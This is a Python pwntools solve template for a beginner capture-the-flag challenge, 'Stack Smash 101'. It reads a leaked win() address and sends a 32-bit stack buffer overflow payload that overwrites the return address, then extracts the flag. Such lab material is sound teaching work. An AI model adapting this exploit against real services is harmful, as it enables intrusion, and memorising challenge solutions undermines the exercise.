#!/usr/bin/env python3
"""
solve_template.py  —  Stack Smash 101 (starter template for players)

This is a HELPER TEMPLATE provided with the challenge.
Players fill in the offset and run it against the remote service.

Install pwntools:  pip install pwntools
Run:               python solve_template.py
"""
from pwn import *

# ---- CONFIG ----
HOST = "localhost"
PORT = 4444
# ----------------

context.arch = 'i386'
context.log_level = 'info'

def exploit(io):
    # Step 1: Read the win() address leaked by the binary
    io.recvuntil(b"win()  is at: ")
    win_addr = int(io.recvline().strip(), 16)
    log.success(f"win() @ {hex(win_addr)}")

    # Step 2: Read the prompt
    io.recvuntil(b"Enter your name: ")

    # Step 3: Build the payload
    # Layout: [64 bytes buffer][4 bytes saved EBP][4 bytes return addr]
    # Find offset with: python3 -c "from pwn import *; print(cyclic(120))"
    # Then check the crash EIP in gdb/pwndbg with: cyclic_find(eip_value)

    BUFFER_SIZE  = 64
    SAVED_EBP    = 4   # 32-bit
    PADDING      = BUFFER_SIZE + SAVED_EBP

    payload  = b"A" * PADDING       # overflow the buffer + saved EBP
    payload += p32(win_addr)        # overwrite return address → win()

    log.info(f"Sending {len(payload)} byte payload")
    io.sendline(payload)

    # Step 4: Receive the flag
    output = io.recvall(timeout=3).decode(errors='replace')
    print("\n" + output)

    if "CTF{" in output:
        flag = output[output.index("CTF{"):output.index("}", output.index("CTF{")) + 1]
        log.success(f"FLAG: {flag}")
    else:
        log.warning("Flag not found in output. Check your offset!")


if __name__ == "__main__":
    io = remote(HOST, PORT)
    exploit(io)
    io.close()
